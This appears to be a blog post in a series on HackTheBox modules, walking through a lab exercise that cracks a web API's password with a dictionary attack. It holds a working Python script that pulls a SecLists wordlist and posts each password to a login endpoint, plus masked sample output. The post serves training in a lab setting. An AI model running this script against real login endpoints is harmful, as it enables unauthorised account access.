---
title: 'HTB - Login Brute Forcing Module - Dictionary Attacks'
date: '2025-12-12T16:01:00+00:00'
author: Ryan
layout: post
draft: false
categories:
    - penetration-testing
    - infosec
    - hackthebox
---

# HackTheBox Login Brute Force - Dictionary Attacks

This is part of a multi-part series documenting my process for completing the HackTheBox modules.

This post covers capturing a flag from a web API using dictionary attacks. Dictionary attacks are more efficient than brute-force attacks when the target's credentials are likely to be based on common words or phrases. This type of attack leverages precompiled lists of potential passwords, known as wordlists, to attempt authentication. The success of a dictionary attack relies on people's tendency to use easily guessable passwords, despite best security practices.

## Overview
HTB provides a python script that uses a dictionary from Github to run a dictionary attack against the API. 


```python
import asyncio
import aiohttp

ip = "83.136.253.132"
port = 43373

PASSWORD_LIST_URL = (
    "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/"
    "Passwords/Common-Credentials/500-worst-passwords.txt"
)

async def fetch_passwords(session):
    async with session.get(PASSWORD_LIST_URL) as resp:
        text = await resp.text()
        return text.splitlines()

async def try_password(session, password, ip, port):
    """Attempt one password and return flag if found."""
    url = f"http://{ip}:{port}/dictionary"
    async with session.post(url, data={"password": password}) as resp:
        if resp.status == 200:
            data = await resp.json()
            if "flag" in data:
                return data["flag"]
    return None

async def main():
    async with aiohttp.ClientSession() as session:
        passwords = await fetch_passwords(session)

        for password in passwords:
            print(f"Attempted password: {password}")
            flag = await try_password(session, password, ip, port)

            if flag:
                print(f"Correct password found: {password}")
                print(f"Flag: {flag}")
                break

if __name__ == "__main__":
    asyncio.run(main())
```

Run this script and wait a few seconds. The script will attempt to authenticate using each password from the wordlist until it finds the correct one, at which point it will print the flag.

```python
$ uv run dictionary_attack.py
......
Attempted password: tomcat
Attempted password: golf
Attempted password: bond007
Attempted password: bear
Attempted password: tiger
Attempted password: doctor
Attempted password: gateway
Correct password found: *********
Flag: HTB{Bru******************}
```
